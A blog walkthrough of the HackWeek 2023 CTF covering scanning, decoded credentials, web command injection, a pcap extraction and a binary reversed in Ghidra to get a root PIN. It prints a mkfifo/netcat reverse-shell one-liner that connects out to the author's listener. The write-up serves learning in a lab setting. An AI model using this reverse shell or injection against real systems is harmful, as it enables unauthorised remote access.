@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackWeek 2023 - CTF - Saad Akhtar</title><meta name="Description" content="HackWeek 2023 CTF by FAST-KHI walkthrough."><meta property="og:title" content="HackWeek 2023 - CTF" />
+<meta property="og:description" content="HackWeek 2023 CTF by FAST-KHI walkthrough." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/hackweek23-ctf/" /><meta property="og:image" content="/hackweek23-ctf/0.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-29T20:00:21+05:00" />
+<meta property="article:modified_time" content="2023-01-29T20:00:21+05:00" /><meta property="og:site_name" content="Saad Akhtar" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/hackweek23-ctf/0.jpg"/>
+<meta name="twitter:title" content="HackWeek 2023 - CTF"/>
+<meta name="twitter:description" content="HackWeek 2023 CTF by FAST-KHI walkthrough."/>
+<meta name="application-name" content="Saad Akhtar">
+<meta name="apple-mobile-web-app-title" content="Saad Akhtar"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="favicon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/hackweek23-ctf/" /><link rel="prev" href="/hackthebox-ambassador/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackWeek 2023 - CTF",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/hackweek23-ctf\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/hackweek23-ctf\/0.jpg",
+                            "width":  1000 ,
+                            "height":  1000 
+                        }],"genre": "posts","keywords": "ctf, writeup","wordcount":  625 ,
+        "url": "\/hackweek23-ctf\/","datePublished": "2023-01-29T20:00:21+05:00","dateModified": "2023-01-29T20:00:21+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Saad Akhtar"
+            },"description": "HackWeek 2023 CTF by FAST-KHI walkthrough."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackWeek 2023 - CTF</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://ssaadakhtarr.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Saad Akhtar</a></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-01-29">2023-01-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;625 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackweek23-ctf/0.jpg"
+        data-srcset="/hackweek23-ctf/0.jpg, /hackweek23-ctf/0.jpg 1.5x, /hackweek23-ctf/0.jpg 2x"
+        data-sizes="auto"
+        alt="/hackweek23-ctf/0.jpg"
+        title="HackWeek 2023 CTF by FAST-KHI walkthrough." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#pcap-analysis">pcap Analysis</a></li>
+    <li><a href="#reversing-the-binary">Reversing the binary</a></li>
+    <li><a href="#root-flag">Root flag</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This post is focused on the walkthrough of HackWeek 2023 CTF by FAST-KHI.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Starting off with the initial nmap scan.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bash
+</span></span><span class="line"><span class="cl">┌──(kali💥kali)-[~/Desktop/tryhackme/hackweek23]
+</span></span><span class="line"><span class="cl">└─$ nmap -A -vv 10.10.58.161 -oN nmapN
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON  VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 1f2241ada68cbcd78a633f50bd963571 (RSA)
+</span></span><span class="line"><span class="cl">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYSzzObiEyY3dbw3mzROyvdlbFShgmyG4hrdgmhhBfzysf92hsRAfoQCiGb31/hjD9HEHZArgiT46H5qUHa6zEEWsoRznouTtgeMw+Jz0TsBUQU5t0nm9xwQRAWcX4fDpU27hSn3JNHAmHF0v5njGn65we6cncfDTJK3rRJiJ35zliR2ogius+F3Cqc4I44mFJzdavT1LYJ9JT8fKac7XKlUVPlje7OzS2eS2YknDLNq18HtGAqQvgkZn12BcANOD+hqlJw+i172OcT5XZoxDKqPnm+9lQXzRrUdMJMArb3EZGPg+GyVyL26L3VW37nNQzPaTFcZ5JOf3gEXl+igf8x2GvKsO4oPj7lQ6OeLnn307fSnDbRJSZ84khSoKDcGqXrnYNObZqU+RZKNUg4mTirM8iuoPRNCCqc4NTS0GwpICaBb8W6uouS5gZPboAP8qkyBHl8fXZMt2ibetePDKMIYnoU3d0Ehz/zbCq2pB7Prn7ZASulnH9iqH4/6/Pz4k=
+</span></span><span class="line"><span class="cl">|   256 b9bbc4e05bc0110faf308e1920363866 (ECDSA)
+</span></span><span class="line"><span class="cl">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG8pbjCFQncSLJDkddPU28VRxryr19fQ4hR+WJJJjDGwqAav8uFYvW2rpRec8PSZJsmbgLeTcKqt7evakUjOwMU=
+</span></span><span class="line"><span class="cl">|   256 b31838a4ef7ccd8cfc252ad8680b75e3 (ED25519)
+</span></span><span class="line"><span class="cl">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPvOwse5rkVQbQT9FtSOcp4jImJ0kMvaOPrDiG2vpz4o
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+</span></span><span class="line"><span class="cl">| http-methods: 
+</span></span><span class="line"><span class="cl">|_  Supported Methods: HEAD GET POST OPTIONS
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.41 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-title: HackWeek &#39;23
+</span></span><span class="line"><span class="cl">| http-robots.txt: 1 disallowed entry 
+</span></span><span class="line"><span class="cl">|_/MWzF2MqBWW
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Starting with port 80.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/1.png" title="Website" data-thumbnail="/hackweek23-ctf/1.png" data-sub-html="<h2>Website</h2><p>Website</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/1.png"
+            data-srcset="/hackweek23-ctf/1.png, /hackweek23-ctf/1.png 1.5x, /hackweek23-ctf/1.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/1.png" width="1919" height="866" />
+    </a><figcaption class="image-caption">Website</figcaption>
+    </figure></p>
+<p>Checking the source of the page, we see the following text.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/2.png" title="Page Source" data-thumbnail="/hackweek23-ctf/2.png" data-sub-html="<h2>Page Source</h2><p>Page Source</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/2.png"
+            data-srcset="/hackweek23-ctf/2.png, /hackweek23-ctf/2.png 1.5x, /hackweek23-ctf/2.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/2.png" width="1919" height="863" />
+    </a><figcaption class="image-caption">Page Source</figcaption>
+    </figure></p>
+<p>Also, the nmap scan revealed a disallowed entry in <code>robots.txt</code> file.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/3.png" title="nmap scan" data-thumbnail="/hackweek23-ctf/3.png" data-sub-html="<h2>nmap scan</h2><p>nmap scan</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/3.png"
+            data-srcset="/hackweek23-ctf/3.png, /hackweek23-ctf/3.png 1.5x, /hackweek23-ctf/3.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/3.png" width="1919" height="490" />
+    </a><figcaption class="image-caption">nmap scan</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/4.png" title="robots.txt" data-thumbnail="/hackweek23-ctf/4.png" data-sub-html="<h2>robots.txt</h2><p>robots.txt</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/4.png"
+            data-srcset="/hackweek23-ctf/4.png, /hackweek23-ctf/4.png 1.5x, /hackweek23-ctf/4.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/4.png" width="1920" height="336" />
+    </a><figcaption class="image-caption">robots.txt</figcaption>
+    </figure></p>
+<p>Visiting the endpoint, we get username and password in encoded form.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/5.png" title="username and password" data-thumbnail="/hackweek23-ctf/5.png" data-sub-html="<h2>username and password</h2><p>username and password</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/5.png"
+            data-srcset="/hackweek23-ctf/5.png, /hackweek23-ctf/5.png 1.5x, /hackweek23-ctf/5.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/5.png" width="1920" height="505" />
+    </a><figcaption class="image-caption">username and password</figcaption>
+    </figure></p>
+<p>Decoding it with <code>Cyber Chef</code> from <code>base32</code> we get clear text credentials.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/6.png" title="username" data-thumbnail="/hackweek23-ctf/6.png" data-sub-html="<h2>username</h2><p>username</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/6.png"
+            data-srcset="/hackweek23-ctf/6.png, /hackweek23-ctf/6.png 1.5x, /hackweek23-ctf/6.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/6.png" width="1919" height="593" />
+    </a><figcaption class="image-caption">username</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/7.png" title="password" data-thumbnail="/hackweek23-ctf/7.png" data-sub-html="<h2>password</h2><p>password</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/7.png"
+            data-srcset="/hackweek23-ctf/7.png, /hackweek23-ctf/7.png 1.5x, /hackweek23-ctf/7.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/7.png" width="1919" height="597" />
+    </a><figcaption class="image-caption">password</figcaption>
+    </figure></p>
+<p>We got the answer to the first question which is <code>Blackmagic</code>.</p>
+<h2 id="foothold">Foothold</h2>
+<p>Logging in, we get the following page.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/8.png" title="random page" data-thumbnail="/hackweek23-ctf/8.png" data-sub-html="<h2>random page</h2><p>random page</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/8.png"
+            data-srcset="/hackweek23-ctf/8.png, /hackweek23-ctf/8.png 1.5x, /hackweek23-ctf/8.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/8.png" width="1920" height="861" />
+    </a><figcaption class="image-caption">random page</figcaption>
+    </figure></p>
+<p>As the description says, we can run commands on this page.</p>
+<p>Running <code>id</code> command we see the output reflected.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/9.png" title="command injection" data-thumbnail="/hackweek23-ctf/9.png" data-sub-html="<h2>command injection</h2><p>command injection</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/9.png"
+            data-srcset="/hackweek23-ctf/9.png, /hackweek23-ctf/9.png 1.5x, /hackweek23-ctf/9.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/9.png" width="1919" height="859" />
+    </a><figcaption class="image-caption">command injection</figcaption>
+    </figure></p>
+<p>Simply copy a reverse shell from <a href="https://www.revshells.com/" target="_blank" rel="noopener noreffer ">revshells</a> and start a listener.</p>
+<p>On my Kali machine,</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/10.png" title="nc" data-thumbnail="/hackweek23-ctf/10.png" data-sub-html="<h2>nc</h2><p>nc</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/10.png"
+            data-srcset="/hackweek23-ctf/10.png, /hackweek23-ctf/10.png 1.5x, /hackweek23-ctf/10.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/10.png" width="1908" height="215" />
+    </a><figcaption class="image-caption">nc</figcaption>
+    </figure></p>
+<p>And then on the website enter the following.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.18.2.202 4444 &gt;/tmp/f
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackweek23-ctf/11.png" title="entering the shell" data-thumbnail="/hackweek23-ctf/11.png" data-sub-html="<h2>entering the shell</h2><p>entering the shell</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/11.png"
+            data-srcset="/hackweek23-ctf/11.png, /hackweek23-ctf/11.png 1.5x, /hackweek23-ctf/11.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/11.png" width="1920" height="839" />
+    </a><figcaption class="image-caption">entering the shell</figcaption>
+    </figure></p>
+<p>And we get the connection back on our machine.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/12.png" title="shell" data-thumbnail="/hackweek23-ctf/12.png" data-sub-html="<h2>shell</h2><p>shell</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/12.png"
+            data-srcset="/hackweek23-ctf/12.png, /hackweek23-ctf/12.png 1.5x, /hackweek23-ctf/12.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/12.png" width="1914" height="281" />
+    </a><figcaption class="image-caption">shell</figcaption>
+    </figure></p>
+<p>On the current folder there&rsquo;s an interesting file <code>sharkk.pcapng</code>.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/13.png" title="directory listing" data-thumbnail="/hackweek23-ctf/13.png" data-sub-html="<h2>directory listing</h2><p>directory listing</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/13.png"
+            data-srcset="/hackweek23-ctf/13.png, /hackweek23-ctf/13.png 1.5x, /hackweek23-ctf/13.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/13.png" width="1909" height="278" />
+    </a><figcaption class="image-caption">directory listing</figcaption>
+    </figure></p>
+<p>Simply start a python server on the machine to transfer this file to our local machine to further analyze it.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bash
+</span></span><span class="line"><span class="cl">www-data@vagrant:/var/www/html$ python3 -m http.server 8081 &amp;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now <code>wget</code> the file on our machine.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali💥kali)-[~/Desktop/tryhackme/hackweek23]
+</span></span><span class="line"><span class="cl">└─$ wget http://10.10.58.161:8081/sharkk.pcapng
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="pcap-analysis">pcap Analysis</h2>
+<p>Running the <code>file</code> command it shows it&rsquo;s a packet capture file.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/14.png" title="file" data-thumbnail="/hackweek23-ctf/14.png" data-sub-html="<h2>file</h2><p>file</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/14.png"
+            data-srcset="/hackweek23-ctf/14.png, /hackweek23-ctf/14.png 1.5x, /hackweek23-ctf/14.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/14.png" width="1905" height="79" />
+    </a><figcaption class="image-caption">file</figcaption>
+    </figure></p>
+<p>Upon analyzing the capture file in <code>wireshark</code>, we can go to File &gt; Export Objects &gt; HTTP and save the files.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/24.png" title="HTTP objects" data-thumbnail="/hackweek23-ctf/24.png" data-sub-html="<h2>HTTP objects</h2><p>HTTP objects</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/24.png"
+            data-srcset="/hackweek23-ctf/24.png, /hackweek23-ctf/24.png 1.5x, /hackweek23-ctf/24.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/24.png" width="1919" height="883" />
+    </a><figcaption class="image-caption">HTTP objects</figcaption>
+    </figure></p>
+<p>We have two files one is the <code>html</code> code while the other is a binary name <code>simple_math</code>.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/15.png" title="simple_math" data-thumbnail="/hackweek23-ctf/15.png" data-sub-html="<h2>simple_math</h2><p>simple_math</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/15.png"
+            data-srcset="/hackweek23-ctf/15.png, /hackweek23-ctf/15.png 1.5x, /hackweek23-ctf/15.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/15.png" width="1903" height="76" />
+    </a><figcaption class="image-caption">simple_math</figcaption>
+    </figure></p>
+<h2 id="reversing-the-binary">Reversing the binary</h2>
+<p>Upon running the binary, we have to enter a 4-digit PIN in order to get the <code>root</code> password.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/16.png" title="running the binary" data-thumbnail="/hackweek23-ctf/16.png" data-sub-html="<h2>running the binary</h2><p>running the binary</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/16.png"
+            data-srcset="/hackweek23-ctf/16.png, /hackweek23-ctf/16.png 1.5x, /hackweek23-ctf/16.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/16.png" width="1907" height="186" />
+    </a><figcaption class="image-caption">running the binary</figcaption>
+    </figure></p>
+<p>The link provided by the binary was a great help to the challenge but I won&rsquo;t be discussing it here. :)</p>
+<p><code>Hint: </code> <a href="https://youtu.be/DLzxrzFCyOs" target="_blank" rel="noopener noreffer ">https://youtu.be/DLzxrzFCyOs</a></p>
+<p>Checking the <code>strings</code> command. We see some interesting strings.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/17.png" title="strings" data-thumbnail="/hackweek23-ctf/17.png" data-sub-html="<h2>strings</h2><p>strings</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/17.png"
+            data-srcset="/hackweek23-ctf/17.png, /hackweek23-ctf/17.png 1.5x, /hackweek23-ctf/17.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/17.png" width="1911" height="797" />
+    </a><figcaption class="image-caption">strings</figcaption>
+    </figure></p>
+<p>The base64 encoded string is the same link we saw above.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali💥kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/blog/chaos<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ <span class="nb">echo</span> <span class="nv">eW91dHUuYmUvREx6eHJ6RkN5T3M</span><span class="o">=</span> <span class="p">|</span> base64 -d
+</span></span><span class="line"><span class="cl">youtu.be/DLzxrzFCyOs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We also see a string <code>password is 1337</code>.</p>
+<p>On entering the password <code>1337</code>, we still didn&rsquo;t get the correct password.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/18.png" title="entering 1337" data-thumbnail="/hackweek23-ctf/18.png" data-sub-html="<h2>entering 1337</h2><p>entering 1337</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/18.png"
+            data-srcset="/hackweek23-ctf/18.png, /hackweek23-ctf/18.png 1.5x, /hackweek23-ctf/18.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/18.png" width="1907" height="184" />
+    </a><figcaption class="image-caption">entering 1337</figcaption>
+    </figure></p>
+<p>Let&rsquo;s fire up <code>ghidra</code> to analyze it further then.</p>
+<p>While analyzing the main function, we have a variable whose value is <code>1337</code>.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/19.png" title="local_98" data-thumbnail="/hackweek23-ctf/19.png" data-sub-html="<h2>local_98</h2><p>local_98</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/19.png"
+            data-srcset="/hackweek23-ctf/19.png, /hackweek23-ctf/19.png 1.5x, /hackweek23-ctf/19.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/19.png" width="986" height="591" />
+    </a><figcaption class="image-caption">local_98</figcaption>
+    </figure></p>
+<p>On further analysis, another variable <code>local_8c</code> calls the <code>pin()</code> function and with whatever value we input.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/20.png" title="local_8c" data-thumbnail="/hackweek23-ctf/20.png" data-sub-html="<h2>local_8c</h2><p>local_8c</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/20.png"
+            data-srcset="/hackweek23-ctf/20.png, /hackweek23-ctf/20.png 1.5x, /hackweek23-ctf/20.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/20.png" width="977" height="564" />
+    </a><figcaption class="image-caption">local_8c</figcaption>
+    </figure></p>
+<p>Checking the pin function, it adds <code>100</code> to our input value.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/21.png" title="pin function" data-thumbnail="/hackweek23-ctf/21.png" data-sub-html="<h2>pin function</h2><p>pin function</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/21.png"
+            data-srcset="/hackweek23-ctf/21.png, /hackweek23-ctf/21.png 1.5x, /hackweek23-ctf/21.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/21.png" width="983" height="303" />
+    </a><figcaption class="image-caption">pin function</figcaption>
+    </figure></p>
+<p>Further below on the main function, in the <code>else if</code> part, there&rsquo;s a comparison <code>local_98 == local_8c + 0xba</code>.</p>
+<p>To break it down.</p>
+<ul>
+<li>local_98 = 1337</li>
+<li>local_8c = (our input) + 100</li>
+<li>0xba = 186</li>
+</ul>
+<p>So to solve the challenge, we need to enter <code>1051</code> which is <code>1337 - (100 + 186)</code>.</p>
+<p>Entering <code>1051</code> as PIN, we get the root password.</p>
